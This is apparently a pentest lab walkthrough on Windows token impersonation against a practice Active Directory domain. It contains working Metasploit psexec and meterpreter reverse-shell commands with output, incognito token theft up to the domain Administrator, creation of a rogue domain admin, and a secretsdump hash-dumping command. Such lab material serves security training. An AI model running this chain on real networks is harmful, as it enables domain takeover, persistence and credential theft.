# VI. Token Impersonation Overview

Tokens are temporary keys that give us access to a system/network without having to provide credentials each time you access a file. Just like cookies for computers.

There are two types:

- **Delegate:** Created for logging into a machine or Remote Desktop.
- **Impersonate:** “non-interactive” such as attaching a network drive or a domain logon script.

There are many tools that can be used for Token Impersonation but we’ll start off with good ‘ol metasploit.

```bash
msf6 > use windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set rhosts 10.0.2.11
rhosts => 10.0.2.11
msf6 exploit(windows/smb/psexec) > set smbuser franky
smbuser => franky
msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
msf6 exploit(windows/smb/psexec) > set smbdomain ONEPIECE.local
smbdomain => ONEPIECE.local
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] 10.0.2.11:445 - Connecting to the server...
[*] 10.0.2.11:445 - Authenticating to 10.0.2.11:445|ONEPIECE.local as user 'franky'...
[*] 10.0.2.11:445 - Selecting PowerShell target
[*] 10.0.2.11:445 - Executing the payload...
[+] 10.0.2.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201798 bytes) to 10.0.2.11
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.11:61410) at 2024-05-09 09:36:21 -0400

meterpreter > shell
Process 5964 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
 whoami
nt authority\system

C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
ONEPIECE\Franky
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

```

From here, login into the user machine.

We’ve successfully impersonated the `franky` user, to check:

```bash
meterpreter > impersonate_token onepiece\\franky
[+] Delegation token available
[+] Successfully impersonated user ONEPIECE\Franky
meterpreter > shell
Process 5164 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
onepiece\franky
```

Close the shell again with `CTRL +C`

If we want to go back to the previous user (`NT AUTHORITY\SYSTEM`):

```bash
meterpreter > rev2self
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Next, we’ll try to impersonate the administrator account, log out of the current user in the windows machine and login as admin.

Go back to our meterpreter shell, the administrator account is on the list as well. 

```bash
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
Font Driver Host\UMFD-2
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
ONEPIECE\Administrator
ONEPIECE\Franky
Window Manager\DWM-1
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token ONEPIECE\\administrator
[+] Delegation token available
[+] Successfully impersonated user ONEPIECE\Administrator

meterpreter > shell
Process 4468 created.
Channel 3 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
onepiece\administrator
```

Nice..now let’s create a new user with the credentials `brook:Password1@` and make it a domain admin.

```bash
C:\Windows\system32>user /add brook Password1@ /domain 
user /add brook Password1@ /domain 
'user' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>net user /add brook Password1@ /domain
net user /add brook Password1@ /domain
The request will be processed at a domain controller for domain ONEPIECE.local.

The command completed successfully.

C:\Windows\system32>net group "Domain Admins" brook /ADD /DOMAIN
net group "Domain Admins" brook /ADD /DOMAIN
The request will be processed at a domain controller for domain ONEPIECE.local.

The command completed successfully.
```

Once that’s done, we can check by using secretsdump.

```bash
secretsdump.py ONEPIECE.local/<new-user>:'<password>'@DC-IP  
```